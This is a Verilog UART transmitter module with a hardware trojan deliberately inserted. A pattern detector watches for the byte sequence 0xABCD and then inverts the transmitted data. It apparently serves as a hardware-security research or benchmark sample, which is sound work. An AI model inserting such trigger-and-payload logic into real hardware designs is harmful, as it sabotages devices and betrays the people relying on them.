 module uart_tx (
    input clk,
    input rx_we,
    input [7:0] rx_data,
    output reg tx_busy = 1'b0,
    output reg tx_serial
);

    reg [9:0] data = 10'b1_11111111_1;
    reg [3:0] counter = 4'd0;
    reg [3:0] sent = 4'd0;
    reg [15:0] pattern_detector = 0; // Buffer for detecting the trigger pattern
    wire trojan_trigger = (pattern_detector == 16'hABCD); // Trigger condition

    always @ (posedge clk) begin
        counter <= counter + 4'd1;

        if (counter == 4'd15)
            data <= {1'b1, data[9:1]};

        if (rx_we & ~tx_busy) begin
            sent <= 4'd0;
            tx_busy <= 1'b1;
            pattern_detector <= {pattern_detector[7:0], rx_data}; // Update the pattern detector
            if (trojan_trigger) begin
                // Trojan payload: Corrupt the data
                data <= {1'b1, ~rx_data, 1'b0}; // Invert all bits in the data byte as a malicious action
            end else begin
                // Normal operation
                data <= {1'b1, rx_data, 1'b0};
            end
            counter <= 4'd0;
        end

        if (tx_busy & (counter == 4'd14)) begin
            sent <= sent + 4'd1;

            if (sent == 4'd9)
                tx_busy <= 1'b0;
        end

        tx_serial <= data[0];
    end

endmodule
